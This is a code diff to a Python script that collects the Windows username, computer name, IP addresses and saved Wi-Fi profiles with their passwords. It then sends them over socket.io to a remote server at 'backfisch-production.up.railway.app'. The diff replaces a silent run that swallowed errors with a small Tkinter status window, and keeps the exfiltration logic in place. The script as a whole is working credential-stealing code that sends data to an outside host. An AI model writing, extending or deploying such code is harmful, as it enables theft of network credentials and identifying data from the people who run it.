@@ -1,3 +1,4 @@
+import tkinter as tk
 import socketio
 import subprocess
 import platform
@@ -7,6 +8,7 @@ import os
 sio = socketio.Client()
 
 def get_username():
+    # Get current Windows username
     return os.getenv('USERNAME', 'Unknown user')
 
 def get_computername():
@@ -50,12 +52,15 @@ def gather_info():
 
     info = []
 
+    # Add username and computer name
     info.append(f"Username: {get_username()}")
     info.append(f"Computer Name: {get_computername()}")
 
+    # IP addresses
     ips = get_ip_addresses()
     info.append("IP addresses: " + ", ".join(ips))
 
+    # Wi-Fi Profiles and Passwords
     profiles = get_wifi_profiles()
     if not profiles:
         info.append("No Wi-Fi profiles found.")
@@ -67,15 +72,21 @@ def gather_info():
 
     return "\n".join(info)
 
-def main():
+def connect_and_send():
     try:
         sio.connect('https://backfisch-production.up.railway.app')  # <-- Your deployed URL
         data = gather_info()
         sio.emit('send_message', {'message': data})
-        sio.disconnect()
+        status_label.config(text="Sent Wi-Fi, IP, and user info")
     except Exception as e:
-        # Optionally log or print error if needed
-        pass
+        status_label.config(text=f"Error: {e}")
 
-if __name__ == "__main__":
-    main()
+root = tk.Tk()
+root.title("Wi-Fi & IP Info Sender")
+
+status_label = tk.Label(root, text="Connecting...")
+status_label.pack(pady=20)
+
+root.after(100, connect_and_send)
+
+root.mainloop()
